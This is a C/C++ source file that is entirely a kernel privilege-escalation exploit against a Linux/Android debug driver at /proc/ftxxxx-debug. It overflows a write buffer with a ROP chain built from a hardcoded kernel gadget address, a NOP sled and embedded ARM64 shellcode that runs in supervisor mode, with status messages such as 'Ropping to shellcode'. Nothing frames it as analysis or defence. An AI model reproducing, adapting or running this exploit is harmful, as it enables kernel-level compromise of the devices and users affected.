#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <spawn.h>

uint64_t kernel_base = 0xFFFFFFC000080000ULL;
uint64_t blr_x21 = 0x000000000001e664ULL + kernel_base;
uint64_t nop = 0xd503201fd503201f;
uint64_t junk = 0x4242424242424242;

unsigned char shellcode[] = {
  0x02, 0xf9, 0x98, 0xd2, 0x42, 0x18, 0xa0, 0xf2, 
  0x02, 0xf8, 0xdf, 0xf2, 0xe2, 0xff, 0xff, 0xf2, 
  0xe3, 0x05, 0x80, 0x52, 0x43, 0x00, 0x00, 0x39, 
  0x83, 0x0c, 0x80, 0x52, 0x43, 0x04, 0x00, 0x39, 
  0x23, 0x0c, 0x80, 0x52, 0x43, 0x08, 0x00, 0x39, 
  0x83, 0x0e, 0x80, 0x52, 0x43, 0x0c, 0x00, 0x39, 
  0x23, 0x0c, 0x80, 0x52, 0x43, 0x10, 0x00, 0x39, 
  0xe3, 0x05, 0x80, 0x52, 0x43, 0x14, 0x00, 0x39, 
  0x83, 0x0d, 0x80, 0x52, 0x43, 0x18, 0x00, 0x39, 
  0xe3, 0x0d, 0x80, 0x52, 0x43, 0x1c, 0x00, 0x39, 
  0x63, 0x0c, 0x80, 0x52, 0x43, 0x20, 0x00, 0x39, 
  0x23, 0x0c, 0x80, 0x52, 0x43, 0x24, 0x00, 0x39, 
  0x83, 0x0d, 0x80, 0x52, 0x43, 0x28, 0x00, 0x39, 
  0xe3, 0x05, 0x80, 0x52, 0x43, 0x2c, 0x00, 0x39, 
  0x83, 0x0e, 0x80, 0x52, 0x43, 0x30, 0x00, 0x39, 
  0xa3, 0x0d, 0x80, 0x52, 0x43, 0x34, 0x00, 0x39, 
  0x03, 0x0e, 0x80, 0x52, 0x43, 0x38, 0x00, 0x39, 
  0xe3, 0x05, 0x80, 0x52, 0x43, 0x3c, 0x00, 0x39, 
  0x63, 0x0c, 0x80, 0x52, 0x43, 0x40, 0x00, 0x39, 
  0xa3, 0x0d, 0x80, 0x52, 0x43, 0x44, 0x00, 0x39, 
  0x83, 0x0c, 0x80, 0x52, 0x43, 0x48, 0x00, 0x39, 
  0xe3, 0x03, 0x1f, 0xaa, 0x43, 0x30, 0x01, 0xf8, 
  0xa2, 0x02, 0x02, 0xd1, 0x41, 0x00, 0x40, 0xf9, 
  0x44, 0x04, 0x40, 0xf9, 0xe0, 0x03, 0x1f, 0xaa, 
  0x04, 0x41, 0x18, 0xd5, 0x21, 0x40, 0x18, 0xd5, 
  0x00, 0x40, 0x18, 0xd5, 0xe0, 0x03, 0x9f, 0xd6,
};
 
static int win() {
  puts("[+] Returned from supervisor mode\n");
  return 0;
}

static int exploit() {
    int fd;
    fd = open("/proc/ftxxxx-debug", O_RDWR);
    unsigned char buf[4096];
    memset(buf, 0x41, 1);
    memset(buf+1, 0x0, 1023);

    uint64_t stack_size = 0x1000;
    void *stack_base = mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    if(stack_base == MAP_FAILED) {
      puts("[!] mmap failed!");
      return -1;
    }

    void *stack_top = (void *)((uint64_t)stack_base + stack_size);

    uint64_t *chain = (uint64_t *)&buf[1024];
    *chain++ = (uint64_t)blr_x21;
    *chain++ = (uint64_t)junk;
    *chain++ = (uint64_t)junk;
    *chain++ = (uint64_t)junk;
    *chain++ = ((uint64_t)&win +0x8);
    *chain++ = (uint64_t)((uint64_t)&stack_top);
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    *chain++ = (uint64_t)nop;
    memcpy(buf + 1216, shellcode, sizeof(shellcode));
 
    puts("[+] Ropping to shellcode...");
    write(fd, buf, 1024 + 1216 + sizeof(shellcode));
    puts("[-] Something went wrong...\n");
    return 0;
}

int main() {
    std::cout << "[+] Starting trigger...\n";
    exploit();
    return 0;
}

